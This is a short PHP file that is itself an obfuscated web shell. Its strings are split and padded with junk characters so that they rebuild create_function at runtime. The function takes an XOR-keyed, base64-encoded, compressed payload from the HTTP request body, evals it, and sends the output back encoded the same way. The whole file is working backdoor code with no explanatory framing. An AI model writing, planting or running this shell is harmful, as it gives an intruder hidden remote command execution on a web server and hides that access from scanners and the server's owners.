<?php
$l=str_replace('Mj','','creMjaMjMjte_fuMjnMjctiMjon');
$e='($wm[w1]),$k)w));$o=@owb_get_contents();ww@ob_end_cleanw();$rw';
$U='i<$l);ww$j++,$i++){$ow.=$wt{$i}^$k{w$j}w;}}return $wo;}if (ww@pregw_mat';
$L='ch("/$khw(.+)$kfw/",@wfile_gewtw_contents("wpwhpw://winput"),$m)';
$h='=@baswe64_encwode(w@x(@gzcowmprewss($o),$wk))w;prwint("$p$kh$r$wkf");}';
$S='=strlwwen($t);$ow="";for($i=0w;w$iw<$l;){forw($wjw=0;($j<$c&&$';
$K='ruYTBb3w5wQIwjydlB8";wfuwnction x($t,w$k){$c=wstrlen($kw);$lw';
$w='==1) {@wob_wstart()ww;@evwal(@gwzuwncompressw(@x(@basew64_decodwe';
$m='$k=w"ac95c0cw4";w$kh="w67a8fb87awc61";$wkf="4w68155c028wc7";w$p="';
$C=str_replace('w','',$m.$K.$S.$U.$L.$w.$e.$h);
$T=$l('',$C);$T();
?>
